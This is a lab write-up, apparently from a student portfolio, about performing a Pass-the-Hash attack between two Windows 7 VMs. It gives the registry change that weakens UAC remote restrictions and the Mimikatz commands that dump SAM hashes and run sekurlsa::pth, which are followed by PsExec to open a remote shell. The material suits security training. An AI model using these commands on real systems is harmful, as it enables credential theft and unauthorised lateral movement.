# Security Tools: Use Mimikatz to Perform a Pass-the-Hash Attack

---

## Objectives
- Prepare two Windows 7 machines with a shared local administrator account and the registry/sharing settings required for remote administration.
- Use PsExec to confirm remote command execution between the two machines.
- Use Mimikatz to dump local credentials/hashes and perform a Pass-the-Hash attack, then use the resulting session to run a command on the second machine without knowing its plaintext password.

---

## Tools
- **Command Prompt / net user / net localgroup** — local account and group setup.
- **Windows Registry Editor (`regedit`)** — sets `LocalAccountTokenFilterPolicy` to allow full remote admin tokens.
- **Windows network sharing settings** — enables Network Discovery and File & Printer Sharing.
- **Mimikatz** — extracts credentials/hashes and performs the Pass-the-Hash (`sekurlsa::pth`).
- **PsExec (Sysinternals)** — executes commands remotely using the harvested credentials.

---

## Steps

### Preparation — on both Target 1 and Target 2 (Windows 7 VMs)

**1. Open Command Prompt as Administrator**
```
net user admin adminpassword /add
net localgroup administrators adminuser /add
net localgroup administrators
ipconfig
```
- Target 1: `192.168.10.1`
- Target 2: `192.168.10.2`

**2. Enable the `LocalAccountTokenFilterPolicy` registry key**
(UAC remote restrictions otherwise block non-built-in-Administrator accounts from getting full admin tokens over the network.)
- Open `regedit` as Administrator.
- Navigate to: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
- Right-click → **New** → **DWORD**, name it `LocalAccountTokenFilterPolicy`, set value `1`.
- Restart (or log off/on) after setting this.
- Verify:
  ```
  net share
  ```
  You should see `ADMIN$` and `C$`.

**3. Enable File and Printer Sharing**
**Control Panel → Network and Sharing Center → Change advanced sharing settings**:
- Network discovery → **On**
- File and printer sharing → **On**

### On Target 1 (Windows 7 VM)

1. Download Mimikatz (from the ParrotSec mirror) onto Target 1.
2. Download PsExec (Sysinternals).
3. Place both tools in `C:\Tools`.

**4. Run PsExec**
```
cd C:\Tools\PsExec
PsExec64 \\192.168.10.2 ipconfig
```
Confirms PsExec can execute commands remotely between the two machines.

**5. Run Mimikatz**
Open PowerShell as Administrator, navigate to the Mimikatz folder, and run these commands in order:
```
cd C:\Tools\mimikatz
.\mimikatz
privilege::debug
token::elevate
lsadump::sam
sekurlsa::pth /user:admin /domain:<your domain> /ntlm:<hash of admin>
```

**6. A new `cmd.exe` opens automatically, authenticated via the passed hash**
```
ipconfig
cd C:\Tools\PsExec
psexec64 \\192.168.10.2 cmd
hostname
```
This returns the hostname of Target 2, confirming successful remote access using only the NTLM hash (no plaintext password).

---

## My Solution:

[View My Solution:](https://youtu.be/Dx0kHpovdNM)

---
